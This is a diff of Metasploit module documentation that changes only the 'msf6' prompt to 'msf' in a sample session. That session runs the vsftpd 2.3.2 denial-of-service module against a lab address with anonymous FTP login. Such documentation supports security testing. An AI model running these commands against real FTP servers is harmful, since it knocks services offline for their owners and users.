@@ -139,14 +139,14 @@ Run the module against this container and the container will either slow down or
 ### VSFTPD 2.3.2 - Arch linux
 
 ```
-msf6 > use auxiliary/dos/ftp/vsftpd_232
-msf6 auxiliary(dos/ftp/vstfpd_232) > set rhosts 192.168.56.106
+msf > use auxiliary/dos/ftp/vsftpd_232
+msf auxiliary(dos/ftp/vstfpd_232) > set rhosts 192.168.56.106
 rhosts => 192.168.56.106
-msf6 auxiliary(dos/ftp/vstfpd_232) > set ftpuser anonymous
+msf auxiliary(dos/ftp/vstfpd_232) > set ftpuser anonymous
 ftpuser => anonymous
-msf6 auxiliary(dos/ftp/vstfpd_232) > set ftppass ''
+msf auxiliary(dos/ftp/vstfpd_232) > set ftppass ''
 ftppass => 
-msf6 auxiliary(dos/ftp/vstfpd_232) > run
+msf auxiliary(dos/ftp/vstfpd_232) > run
 [*] Running module against 192.168.56.106
 
 [*] 192.168.56.106:21 - sending payload
